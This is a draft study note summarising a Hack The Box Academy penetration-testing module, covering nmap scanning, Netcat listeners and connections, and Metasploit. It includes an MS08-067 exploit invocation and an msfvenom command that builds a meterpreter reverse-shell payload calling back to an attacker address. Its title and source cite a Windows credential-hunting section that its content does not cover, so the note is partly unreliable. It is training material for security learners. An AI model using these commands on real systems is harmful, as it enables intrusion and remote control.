---
title: Hack The Box - Academy Module 147, Section 1318
aliases: []
tags:
- topic/hack-the-box
- topic/academy
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: 10-147-passwordattacks-10-CredentialHuntingInWindows.pdf
related_tools:
- '[[nmap-1787746090]]'
- '[[net]]'
- '[[netcat]]'
- '[[msfconsole]]'
- '[[msfvenom]]'
related_techniques: []
related_tactics: []
related_services: []
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# Hack The Box - Academy Module 147, Section 1318

## Overview
This module covers the basics of network scanning and enumeration using tools such as Nmap, Net, and Netcat. It also introduces the use of Metasploit for post-exploitation tasks.

## Network Scanning with Nmap
Nmap is a powerful network scanning tool that can be used to discover hosts and services on a network. The module covers basic Nmap commands such as:

```
# Basic Nmap scan
nmap -sP 192.168.1.0/24

# Nmap with detailed output
nmap -sV -O -p- 192.168.1.100
```

The module also covers Nmap scanning and output options, which can be used to gather more detailed information about the target network.

## Network Enumeration with Net and Netcat
Net and Netcat are useful tools for network enumeration. Net can be used to query network services, while Netcat can be used for various network operations such as port scanning and data transfer. The module covers basic commands such as:

```
# Net to query services
net view 192.168.1.100

# Netcat to listen on a port
nc -l -p 4444

# Netcat to connect to a port
nc 192.168.1.100 4444
```

The module also covers how to use Netcat for reverse shell connections.

## Post-Exploitation with Metasploit
Metasploit is a powerful framework for automating the process of attacking and defending against vulnerabilities. The module introduces the use of Metasploit for post-exploitation tasks such as privilege escalation and lateral movement. The module covers basic Metasploit commands such as:

```
# Starting Metasploit console
msfconsole

# Using Metasploit to exploit a vulnerability
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.1.100
exploit

# Using Metasploit to generate a payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe -o payload.exe
```

The module also covers the use of Metasploit for generating payloads and using Meterpreter sessions.

## References
- https://academy.hackthebox.com/module/147/section/1318

